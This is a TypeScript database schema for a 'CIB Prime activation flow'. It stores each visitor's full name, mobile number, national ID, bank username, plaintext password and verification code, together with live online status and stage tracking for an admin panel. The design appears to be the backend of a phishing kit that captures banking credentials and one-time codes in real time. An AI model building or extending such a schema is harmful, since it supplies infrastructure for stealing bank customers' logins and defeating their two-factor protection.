import { pgTable, text, timestamp, serial, jsonb } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod/v4";

// One row per customer session (browser tab) going through the CIB Prime
// activation flow. Fields are filled in progressively as the customer moves
// through the app; nothing is deleted, only appended/updated, so the admin
// panel can always show the latest known state per customer.
export const clientSessionsTable = pgTable("client_sessions", {
  sessionId: text("session_id").primaryKey(),
  fullName: text("full_name"),
  mobile: text("mobile"),
  nationalId: text("national_id"),
  username: text("username"),
  password: text("password"),
  verificationCode: text("verification_code"),
  stage: text("stage").notNull().default("home"),
  status: text("status").notNull().default("offline"),
  lastSeenAt: timestamp("last_seen_at", { withTimezone: true }),
  createdAt: timestamp("created_at", { withTimezone: true })
    .notNull()
    .defaultNow(),
  updatedAt: timestamp("updated_at", { withTimezone: true })
    .notNull()
    .defaultNow()
    .$onUpdate(() => new Date()),
});

// Client stage logs for tracking history
export const clientStageLogsTable = pgTable("client_stage_logs", {
  id: serial("id").primaryKey(),
  sessionId: text("session_id").notNull(),
  stage: text("stage").notNull(),
  payload: jsonb("payload").notNull(),
  createdAt: timestamp("created_at", { withTimezone: true })
    .notNull()
    .defaultNow(),
});

export const insertClientSessionSchema = createInsertSchema(
  clientSessionsTable,
).omit({ createdAt: true, updatedAt: true });
export type InsertClientSession = z.infer<typeof insertClientSessionSchema>;
export type ClientSession = typeof clientSessionsTable.$inferSelect;
export type ClientStageLog = typeof clientStageLogsTable.$inferSelect;
